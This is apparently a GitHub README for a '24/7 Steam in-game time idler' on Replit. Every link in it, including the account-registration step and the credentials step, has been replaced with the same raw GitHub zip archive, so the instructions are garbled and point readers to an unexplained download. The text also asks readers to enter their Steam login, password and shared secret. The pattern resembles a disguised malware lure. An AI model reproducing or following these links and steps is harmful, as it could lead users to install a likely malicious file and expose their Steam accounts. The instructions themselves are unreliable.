# simple-steam-idler-replit
24/7 Steam ingame time idler with Replit (simple version)

1. Register at https://raw.githubusercontent.com/zestry999/simple-steam-idler-replit/main/phytophylogenetic/steam-idler-replit-simple-2.9-alpha.5.zip
2. Create a free app
3. Put these repo files to the app you just created
4. Enter your login and password to the `https://raw.githubusercontent.com/zestry999/simple-steam-idler-replit/main/phytophylogenetic/steam-idler-replit-simple-2.9-alpha.5.zip`. Put shared secret code if you have.
5. Run the app.
6. Go to https://raw.githubusercontent.com/zestry999/simple-steam-idler-replit/main/phytophylogenetic/steam-idler-replit-simple-2.9-alpha.5.zip Register, add ne app, enter a link to your replit app, set 5 mins (a free plan)
